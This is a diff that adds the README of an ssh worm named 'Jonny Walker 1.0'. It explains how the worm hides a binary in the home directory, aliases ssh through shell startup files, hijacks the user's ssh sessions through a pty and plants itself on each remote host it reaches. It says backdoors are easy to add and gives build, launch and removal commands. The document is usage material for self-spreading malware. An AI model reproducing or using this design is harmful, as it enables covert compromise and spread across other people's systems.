@@ -1,0 +1,21 @@
+Jonny Walker 1.0
+================
+
+Jonny is a ssh worm. Make sure you know what you are doing
+before starting or compiling it.
+
+Jonny will define aliases from "$HOME/ " to ssh and
+/usr/bin/ssh. Once user calls ssh to log into a remote
+site, Jonny will slip the real ssh output through a pty
+and controls the whole session. Once it sees prompt of remote
+shell he will plant himself there so that following ssh
+sessions from that account will be wormed too.
+Appropriate backdooring-functions may be added very easily.
+
+To build Jonny, just type './plant'. Then
+"./walker root@remote.host"
+
+To remove Jonny, remove the ssh aliases from .bashrc,
+.bash_profile and .cshrc. Also remove ' ' binary in ~.
+
+
